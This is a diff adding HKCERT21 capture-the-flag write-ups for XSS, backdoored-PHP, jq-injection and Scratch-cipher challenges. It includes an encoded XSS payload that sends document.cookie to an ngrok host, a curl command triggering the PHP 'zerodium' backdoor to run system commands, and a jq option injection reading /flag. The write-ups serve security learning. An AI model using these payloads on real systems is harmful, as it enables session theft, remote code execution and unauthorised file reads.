@@ -331,4 +331,145 @@ FLAG : **hkcert21{4lw4ys_l0ok_4t_s74ck_0verf1ow_wh3n_y0u_w4nt_t0_4v01d_s7ack_0v3
 P.S. I sent this meme to the author after solved this challenge :)
 ![haha](https://user-images.githubusercontent.com/19466939/141827583-69430cb6-5f2e-425d-8699-74d7f9c892a4.png)
 
-...To be updated...
+## 純孩兒 (babyXSS) - Web (100 points)
+### Challenge :
+
+> Have you tried the infant xss challenge in the training platform? If you did, then you can try out this BABY XSS CHALLENGE...  
+http://babyxss-m7neh9.hkcert21.pwnable.hk  
+XSS Bot: http://xssbot-cxild5.hkcert21.pwnable.hk
+
+### Solution : 
+Checking the source code of the webpage, we can obtain some obfuscated javascript.
+```
+TOUPPERCASE = "\164\157\125\160\160\145\162\103\141\163\145";
+SUBSTR = "\163\165\142\163\164\162";
+ENCODEURI = "\145\156\143\157\144\145\125\122\111";
+DECODEURI = "\144\145\143\157\144\145\125\122\111";
+VALUE = "\166\141\154\165\145";
+SRCDOC = "\163\162\143\144\157\143";
+CONTENTWINDOW = "\143\157\156\164\145\156\164\127\151\156\144\157\167";
+PARENT = "\160\141\162\145\156\164";
+LOCATION = "\154\157\143\141\164\151\157\156";
+HASH = "\150\141\163\150";
+WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
+
+CONVERT = () => {
+    INPUT[VALUE] = WINDOW[DECODEURI](WINDOW[LOCATION][HASH][SUBSTR](1));
+    OUTPUT[SRCDOC] = INPUT[VALUE][TOUPPERCASE]();
+```
+Tried to deobfuscate the code using https://deobfuscate.io/, we can get:
+```
+TOUPPERCASE = "toUpperCase";
+SUBSTR = "substr";
+ENCODEURI = "encodeURI";
+DECODEURI = "decodeURI";
+VALUE = "value";
+SRCDOC = "srcdoc";
+CONTENTWINDOW = "contentWindow";
+PARENT = "parent";
+LOCATION = "location";
+HASH = "hash";
+WINDOW = OUTPUT[CONTENTWINDOW][PARENT];
+```
+Next let's rewrite the `CONVERT` function:
+```
+CONVERT = () => {
+    INPUT[VALUE] = decodeURI(location.hash.substr(1));
+    OUTPUT[SRCDOC] = INPUT.value.toUpperCase();
+```
+From the `CONVERT` function, we know that it will take the input from the URL after `#` and convert to uppercase, i.e. for `http://babyxss-m7neh9.hkcert21.pwnable.hk/#%3Cscript%3Ealert('XSS')%3C/script%3E`, it will be converted to `<SCRIPT>ALERT('XSS')</SCRIPT>` which is not a valid javascript as shown below:
+[pic]
+Therefore we need to find some function that is also defined in uppercase.
+We can use html encoding to bypass the `toUpperCase`.
+
+**Solve:**
+```
+http://babyxss-m7neh9.hkcert21.pwnable.hk/#%3Cimg%20src=x%20onerror=%22&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x68;&#x72;&#x65;&#x66;&#x3D;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x33;&#x61;&#x63;&#x63;&#x2D;&#x31;&#x38;&#x33;&#x2D;&#x31;&#x37;&#x39;&#x2D;&#x37;&#x32;&#x2D;&#x32;&#x33;&#x30;&#x2E;&#x6E;&#x67;&#x72;&#x6F;&#x6B;&#x2E;&#x69;&#x6F;&#x2F;&#x3F;&#x66;&#x6C;&#x61;&#x67;&#x3D;&#x27;&#x2B;&#x65;&#x6E;&#x63;&#x6F;&#x64;&#x65;&#x55;&#x52;&#x49;&#x43;&#x6F;&#x6D;&#x70;&#x6F;&#x6E;&#x65;&#x6E;&#x74;&#x28;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x63;&#x6F;&#x6F;&#x6B;&#x69;&#x65;&#x29;%22%3E%3C/img%3E
+```
+FLAG : **hkcert21{zOMG_MY_KEYBOARD_IS_BROKEN_CANNOT_TURN_OFF_CAPSLOCK111111111}**
+
+## 荊棘海 (The Wilderness) - Web (100 points)
+### Challenge :
+>>就在回望一刻總有哀 世界已不再 誰偏偏一再 等待 到終於不記得等待  
+
+>Mystiz likes PHP most. He has been programming in PHP at the time PHP 5 was released. Time flies and here comes PHP 8. He decided to craft a Docker image as a sandbox... What can go wrong?  
+http://chalp.hkcert21.pwnable.hk:28364/
+
+### Files : 
+[sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip](/files/HKCERT/sea-of-thorns_e045a87b1909724e7292510354cc1f3b.zip)
+
+### Solution : 
+From the `index.php` we know that the flag is in the comment block of the source code, but there is no other useful stuff inside...so let's have a look at the Docker file.  
+From the `Dockerfile`, it is weird that the PHP is installed by downloading a specific version of PHP from Github (`wget https://github.com/php/php-src/archive/c730aa26bd52829a49f2ad284b181b7e82a68d7d.zip`). By Googling the hash we can find that it is the affected version of the hacked PHP, which the PHP Git server was hacked and a RCE backdoor was injected into the source code. Therefore we can exploit the RCE to get the content of the `index.php`, i.e. the flag by adding the HTTP header `User-Agentt` with the command prepending the magic word `zerodium`.
+
+**Solve:**  
+`curl http://chalp.hkcert21.pwnable.hk:28364/ -H "User-Agentt: zerodiumsystem('cat index.php');"`
+
+FLAG : **hkcert21{vu1n3r1b1li7ie5_m1gh7_c0m3_fr0m_7h3_5upp1y_ch41n}**
+
+## 樂園 (JQ Playground) - Web (200 points)
+### Challenge :
+>I wrote a simple testbed for the JSON processor jq!  
+The flag is written in the file /flag.  
+http://chalp.hkcert21.pwnable.hk:28370/
+
+### Solution : 
+At the bottom of the webpage, we can see the button [`View Source`](http://chalp.hkcert21.pwnable.hk:28370/?-s) and get the key source code:
+```
+<?php
+if (isset($_GET["-s"])) {
+    highlight_file(__FILE__);
+    exit();
+}
+if (!empty($_POST)) {
+  if (empty($_POST['filter']) || empty($_POST['json'])) {
+    die("Filter or JSON is empty");
+  }
+
+  $filter = escapeshellarg($_POST['filter']);
+  $json = escapeshellarg($_POST['json']);
+  
+  $options = "";
+
+  if (!empty($_POST['options']) && is_array($_POST['options'])) {
+    foreach ($_POST['options'] as $o) {
+      $options .= escapeshellarg($o) . ' ';
+    }
+  }
+
+  $command = "jq $options $filter";
+  passthru("echo $json | $command");
+
+  die();
+}
+```
+We can see that we are providing parameters and input to call the `jq` and our goal is to get the file `/flag`. With some [Googling](https://www.jianshu.com/p/e05a5940f833) I found that we can use `--rawfile` to get the file content. With some trials to crafting the payload, we can get the flag by reflecting the content out with the command `echo {"data":{"update":null}}' | jq --rawfile a /flag '.data.update = $a'`.
+
+**Solve:**  
+`curl -X POST 'http://chalp.hkcert21.pwnable.hk:28370/' -F 'filter=.data.update=$a' -F 'json={"data":{"update":null}}' -F 'options[]=--rawfile' -F 'options[]=a' -F 'options[]=/flag'`
+
+FLAG : **hkcert21{y0u\\are\\n0w\\jq\\expert!}**
+
+## 回到12歲 (scratch-tic-tac-toe) - Misc (200 points)
+### Challenge :
+>If you can beat me in the game I'll give you the flag!  
+https://scratch.mit.edu/projects/596813541/
+
+### Solution : 
+This is a Tic-Tac-Toe game written in Scratch. It did bring me back to my F.4 life which I learnt about Scratch in my ICT lesson.  
+We can click the `See inside` button to view the source code of this project. By selecting the `Title`, we can see a yellow notes and if you remove it, you can see the key logic of getting the flag.
+[pic1]
+[pic2]
+We can see that if we input the correct flag, the program will perform some process and check if it is equal to `03vx{_ihq0xhh7svtx}t{sv180x{r`. Therefore, by reversing the logic, we can get the flag.
+
+**Solve:**  
+```
+charset = "abcdefghijklmnopqrstuvwxyz0123456789{}_"
+cipher = "03vx{_ihq0xhh7svtx}t{sv180x{r"
+flag = ""
+for i in range(len(cipher)):
+    flag = flag + charset[charset.find(cipher[i]) - 19 % len(charset)]
+print(flag)
+```
+
+FLAG : **hkcert21{he11o_caesar_cipher}**
